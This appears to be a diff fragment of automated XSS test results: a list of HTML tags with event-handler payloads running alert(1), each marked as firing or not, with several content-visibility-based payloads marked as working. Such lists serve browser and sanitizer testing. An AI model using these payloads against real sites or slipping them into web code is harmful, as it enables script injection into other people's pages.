+Payload: <frameset><frame id=x onfocus=alert(1)> | Alert: False
+Payload: <frameset><frame id=x onfocusin=alert(1)> | Alert: False
+Payload: <frameset><frame onload=alert(1)> | Alert: False
+Payload: <h1 oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <h1 oncontextmenu="alert(1)" style=display:block>test</h1> | Alert: False
+Payload: <head contenteditable onbeforeinput=alert(1)>test | Alert: False
+Payload: <head id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></head> | Alert: False
+Payload: <head id=x tabindex=1 onfocus=alert(1) style=display:block></head> | Alert: False
+Payload: <head id=x tabindex=1 onfocusin=alert(1) style=display:block></head> | Alert: False
+Payload: <head onblur=alert(1) id=x tabindex=1 style=display:block>test</head><input value=clickme> | Alert: False
+Payload: <head oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: False
+Payload: <head oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <head oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <head onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <head onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</head><input value=clickme> | Alert: False
+Payload: <head onmousewheel=alert(1) style=display:block>requires scrolling | Alert: False
+Payload: <head onpointercancel=alert(1)>XSS</head> | Alert: False
+Payload: <head onpointerdown=alert(1) style=display:block>XSS</head> | Alert: False
+Payload: <head onpointerenter=alert(1) style=display:block>XSS</head> | Alert: False
+Payload: <head onpointerleave=alert(1) style=display:block>XSS</head> | Alert: False
+Payload: <head onpointermove=alert(1) style=display:block>XSS</head> | Alert: False
+Payload: <head onpointerout=alert(1) style=display:block>XSS</head> | Alert: False
+Payload: <head onpointerover=alert(1) style=display:block>XSS</head> | Alert: False
+Payload: <head onpointerrawupdate=alert(1) style=display:block>XSS</head> | Alert: False
+Payload: <head onpointerup=alert(1) style=display:block>XSS</head> | Alert: False
+Payload: <head onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></head> | Alert: False
+Payload: <head onwebkitmouseforcechanged=alert(1)>XSS</head> | Alert: False
+Payload: <head onwebkitmouseforcedown=alert(1)>XSS</head> | Alert: False
+Payload: <head onwebkitmouseforceup=alert(1)>XSS</head> | Alert: False
+Payload: <head onwebkitmouseforcewillbegin=alert(1)>XSS</head> | Alert: False
+Payload: <head onwebkitwillrevealbottom=alert(1)>XSS</head> | Alert: False
+Payload: <hgroup oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <hgroup oncontextmenu="alert(1)" style=display:block>test</hgroup> | Alert: False
+Payload: <html contenteditable onbeforeinput=alert(1)>test | Alert: False
+Payload: <html id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></html> | Alert: False
+Payload: <html id=x tabindex=1 onfocus=alert(1)></html> | Alert: False
+Payload: <html id=x tabindex=1 onfocusin=alert(1)></html> | Alert: False
+Payload: <html onblur=alert(1) id=x tabindex=1 style=display:block>test</html><input value=clickme> | Alert: False
+Payload: <html oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <html oncontextmenu="alert(1)" style=display:block>test</html> | Alert: False
+Payload: <html oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <html oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <html onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <html onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</html><input value=clickme> | Alert: False
+Payload: <html onmousewheel=alert(1) style=display:block>requires scrolling | Alert: False
+Payload: <html onpointercancel=alert(1)>XSS</html> | Alert: False
+Payload: <html onpointerdown=alert(1) style=display:block>XSS</html> | Alert: False
+Payload: <html onpointerenter=alert(1) style=display:block>XSS</html> | Alert: False
+Payload: <html onpointerleave=alert(1) style=display:block>XSS</html> | Alert: False
+Payload: <html onpointermove=alert(1) style=display:block>XSS</html> | Alert: False
+Payload: <html onpointerout=alert(1) style=display:block>XSS</html> | Alert: False
+Payload: <html onpointerover=alert(1) style=display:block>XSS</html> | Alert: False
+Payload: <html onpointerrawupdate=alert(1) style=display:block>XSS</html> | Alert: False
+Payload: <html onpointerup=alert(1) style=display:block>XSS</html> | Alert: False
+Payload: <html onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></html> | Alert: False
+Payload: <html onwebkitmouseforcechanged=alert(1)>XSS</html> | Alert: False
+Payload: <html onwebkitmouseforcedown=alert(1)>XSS</html> | Alert: False
+Payload: <html onwebkitmouseforceup=alert(1)>XSS</html> | Alert: False
+Payload: <html onwebkitmouseforcewillbegin=alert(1)>XSS</html> | Alert: False
+Payload: <html onwebkitwillrevealbottom=alert(1)>XSS</html> | Alert: False
+Payload: <i oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <i oncontextmenu="alert(1)" style=display:block>test</i> | Alert: False
+Payload: <i oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <i oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test | Alert: False
+Payload: <i ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</i> | Alert: False
+Payload: <i onfocus=alert(1) autofocus tabindex=1> | Alert: False
+Payload: <i onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</i><input value=clickme> | Alert: False
+Payload: <i onkeydown="alert(1)" contenteditable style=display:block>test</i> | Alert: False
+Payload: <i onkeypress="alert(1)" contenteditable style=display:block>test</i> | Alert: False
+Payload: <i onkeyup="alert(1)" contenteditable style=display:block>test</i> | Alert: False
+Payload: <iframe2 oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <iframe2 oncontextmenu="alert(1)" style=display:block>test</iframe2> | Alert: False
+Payload: <image oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <image oncontextmenu="alert(1)" style=display:block>test</image> | Alert: False
+Payload: <image3 oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <image3 oncontextmenu="alert(1)" style=display:block>test</image3> | Alert: False
+Payload: <img oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <img oncontextmenu="alert(1)" style=display:block>test</img> | Alert: False
+Payload: <img2 oncontentvisibilityautostatechange=alert(1) style=display:block;content-visibility:auto> | Alert: True
+Payload: <img2 oncontextmenu="alert(1)" style=display:block>test</img2> | Alert: False
